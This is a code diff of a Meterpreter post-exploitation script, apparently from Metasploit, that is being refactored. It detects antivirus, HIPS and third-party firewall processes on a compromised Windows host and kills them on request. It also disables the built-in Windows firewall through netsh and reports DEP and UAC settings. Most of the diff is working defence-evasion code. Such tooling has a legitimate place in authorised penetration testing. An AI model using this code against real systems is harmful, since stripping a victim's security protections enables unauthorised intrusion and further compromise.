@@ -1,16 +1,25 @@
-# $Id:$
-
-#Meterpreter script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration.
-#Provides also the option to kill the processes of detected products and disable the built-in firewall. 
-#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Version: 0.1.0
+# $Id: $
+#
+# Meterpreter script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration.
+# Provides also the option to kill the processes of detected products and disable the built-in firewall. 
+# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
+# Version: 0.1.0
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
-	"-h" => [ false,  "Help menu."                        ],
-	"-k" => [ false,  "Kill any AV, HIPS and Third Party Firewall process found."  ],
-	"-d" => [ false, "Disable built in Firewall"]
+	"-h" => [ false, "Help menu." ],
+	"-k" => [ false, "Kill any AV, HIPS and Third Party Firewall process found." ],
+	"-d" => [ false, "Disable built in Firewall" ]
 )
-#---------------------------------------------------------------------------------------------------------
+
+def usage
+	print_line("Getcountermeasure -- List (or optionally, kill) HIPS and AV")
+	print_line("processes, show XP firewall rules, and display DEP and UAC")
+	print_line("policies")
+	print(@@exec_opts.usage)
+	raise Rex::Script::Completed
+end
+
+#-------------------------------------------------------------------------------
 avs = %W{ 
 	a2adguard.exe
 	a2adwizard.exe
@@ -245,54 +254,48 @@ avs = %W{
 	zegarynka.exe
 	zlclient.exe
 }
-#---------------------------------------------------------------------------------------------------------
-#Function for checking for the presence of AV, HIPS and Third Party firewall and/or kill the processes associated to it
+#-------------------------------------------------------------------------------
+# Check for the presence of AV, HIPS and Third Party firewall and/or kill the
+# processes associated with it
 def check(session,avs,killbit)
 	print_status("Checking for contermeasures...")
 	session.sys.process.get_processes().each do |x|
 		if (avs.index(x['name'].downcase))
 			print_status("\tPossible countermeasure found #{x['name']} #{x['path']}")
-			if (killbit == 1)
+			if (killbit)
 				print_status("\tKilling process for countermeasure.....")
 				session.sys.process.kill(x['pid'])
 			end
 		end
 	end
 end
-#---------------------------------------------------------------------------------------------------------
-#Function for getting the configuration and/or disabling the built in Windows Firewall
+#-------------------------------------------------------------------------------
+# Get the configuration and/or disable the built in Windows Firewall
 def checklocalfw(session,killfw)
-	# Expand environment %TEMP% variable
-	tmp = session.fs.file.expand_path("%TEMP%")
-	# Create random name for the netsh output
-	fwfile = sprintf("%.5d",rand(100000))
-	fwout = "#{tmp}\\#{fwfile}"
 	print_status("Getting Windows Built in Firewall configuration...")
 	opmode = ""
-	r = session.sys.process.execute("cmd.exe /c netsh firewall show opmode >> #{fwout}", nil, {'Hidden' => 'true'})
-	sleep(2)
-	r = session.sys.process.execute("cmd.exe /c type #{fwout}", nil, {'Hidden' => 'true','Channelized' => true})
-		while(d = r.channel.read)
-			opmode << d		
-		end
+	r = session.sys.process.execute("cmd.exe /c netsh firewall show opmode", nil, {'Hidden' => 'true', 'Channelized' => true})
+	while(d = r.channel.read)
+		opmode << d		
+	end
 	r.channel.close
 	r.close
 	opmode.split("\n").each do |o|
 		print_status("\t#{o}")
 	end
-	if (killfw == 1)
+	if (killfw)
 		print_status("Disabling Built in Firewall.....")
 		f = session.sys.process.execute("cmd.exe /c netsh firewall set opmode mode=DISABLE", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = f.channel.read)
 			if d =~ /The requested operation requires elevation./
-				print_status("\tUAC or Insufficient permissions prevented the disabling of Firewal")
+				print_status("\tUAC or Insufficient permissions prevented the disabling of Firewall")
 			end
 		end
 		f.channel.close
 		f.close
 	end
 end
-#---------------------------------------------------------------------------------------------------------
+#-------------------------------------------------------------------------------
 # Function for getting the current DEP Policy on the Windows Target
 def checkdep(session)
 	tmpout = ""
@@ -325,7 +328,7 @@ def checkdep(session)
 	end	
 
 end
-#---------------------------------------------------------------------------------------------------------
+#-------------------------------------------------------------------------------
 def checkuac(session)
 	print_status("Checking if UAC is enabled ...")
 	key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
@@ -341,35 +344,27 @@ def checkuac(session)
 end
 
 ################## MAIN ##################
-# Parsing of Options
-killbt = 0
-killfw = 0
-hlp = 0
-@@exec_opts.parse(args) do |opt, idx, val|
-case opt
-when "-k"
-	killbt = 1
-when "-d"
-	killfw = 1
-when "-h"
-	hlp = 1
-	print( "Getcountermeasure Meterpreter Script\n" + @@exec_opts.usage )
-	raise Rex::Script::Compeleted
+killbt = false
+killfw = false
+@@exec_opts.parse(args) { |opt, idx, val|
+	case opt
+	when "-k"
+		killbt = true
+	when "-d"
+		killfw = true
+	when "-h"
+		usage
+	end
+}
+# get the version of windows
+wnvr = session.sys.config.sysinfo["OS"]
+print_status("Running Getcountermeasure on the target...")
+check(session,avs,killbt)
+if wnvr !~ /Windows 2000/
+	checklocalfw(session, killfw)
+	checkdep(session)
+end
+if wnvr =~ /Windows Vista/
+	checkuac(session)
 end
 
-end
-
-#---------------------------------------------------------------------------------------------------------
-#get the version of windows
-wnvr = session.sys.config.sysinfo
-if (hlp == 0)
-	print_status("Running Getcountermeasure on the target...")
-	check(session,avs,killbt)
-	if not wnvr =~ (/Windows 2000/)
-		checklocalfw(session,killfw)
-		checkdep(session)
-	end
-	if wnvr =~ (/Windows Vista/)
-		checkuac(session)
-	end
-end
